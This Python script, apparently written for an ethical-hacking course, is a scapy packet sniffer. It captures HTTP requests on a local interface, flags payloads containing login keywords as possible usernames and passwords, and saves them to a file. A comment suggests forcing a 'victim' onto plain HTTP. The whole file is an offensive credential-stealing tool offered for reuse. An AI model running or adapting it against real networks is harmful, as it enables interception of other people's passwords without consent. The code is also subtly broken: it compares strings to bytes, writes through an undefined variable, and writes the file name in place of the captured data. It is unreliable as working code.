#!/usr/bin/env python3
'''
This Tool Realeted To Zaid Sabih Python Course But In Python3
This Tool Use Scapy Package To Sniff And Get Data!
It Will Sniff Any Data Not Just Web Data On HTTP Protocol You Can Add A Filter >> Nah I Was Wrong Sorry!
Feel Free TO Edit It Is Yours!
I Will Clean The Code On That Update And Add Some Things!
I Have Explain The Code On Some Comments
Maybe There Is Some Problems I Wil Try To Solve It LOL! -- Solved!
Have Fun!
'''
import scapy.all as scapy 
from scapy.layers import http

def SmallBanner():
	Some = "\t\t\t\t\t\t\t"
	Banner = Some + "[+] << PACKET-SNIFFER >> [+]"
	Other = Some + "InterFace == " + InterFace
	print(Banner)
	print(Other)

# Get Inputs First!
PossibleLoginList = []
InterFace = input("\n[+]Interface: ") # EX: eth0 , wlan0

if InterFace == '':
	InterFace = "eth0"
else:
	pass

def StartSniffData(NetowrkInterface):
	scapy.sniff(iface=NetowrkInterface,store=False,prn=SniffNetworkTrafic) # Start Sniff With Selected InterFace Here

def GetDataFromHTTP(packet): # Get Data From HTTP Requests And Responses If You Want To Capture HTTPS Reqqests And Responses You Have To Force The Victim To Use HTTP Protocol!
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
	
def GetLoginDataFromSites(packet):
	if packet.haslayer(scapy.Raw):
		DataLoaded = packet[scapy.Raw].load
		KeyWords = ["username","login","password","user","pass"] # You Can Add More KeyWords Here!
		for LoginKeyWord in KeyWords:
			if LoginKeyWord in DataLoaded:
				return DataLoaded
				break # LOL IDK Why I But Break If There is An Return Function But I Will Leave That Here LOL

def SniffNetworkTrafic(packet):
	if packet.haslayer(http.HTTPRequest):# Check IF This Request Is HTTP Request IF true Complete This Statment!
		HTTPData = GetDataFromHTTP(packet).decode("UTF-8") # Decode The Results -- Tip For You > latin1 Is So Good For Decode That Cuz Some Times UTF-8 Cuz Some Proplems
		print("[+] HTTP REQUEST >> " + str(HTTPData)) # Tell You That There Is A Traffic On Port 80 (HTTP Port)

		LoginData = GetLoginDataFromSites(packet)
		if LoginData: # If Login Data Returns 'True' Then Do That Print Function
			PossibleLoginList.append(LoginData) # Add Data To Logins List To Save It
			print("\n[+] Possible User/Password >> {0} \n".format(LoginData)) # aTell You That There Is A Possible Login Data

def ExtractAllPossibleLoginsOnTXT():
	FileName = input("Give Me A Name For Logins File: ") # EX : Login
	for Data in PossibleLoginList: # For Each Item iN This List Take Every Item And Put It In that File With New Line!
		with open('{0}.txt'.format(FileName),'w') as LoginsFile:
			LoginFile.write("{0}\n".format(FileName)) # Write Data To login File
		print("[+] Data Saved!") # Print "Data Saved" LOL
		
# Start Functions After Get Inputs!
SmallBanner() # Print The Banner
StartSniffData(InterFace) # Start Sniff Data From Selected InterFACE 
ExtractAllPossibleLoginsOnTXT() # Save Login Information On A Text File
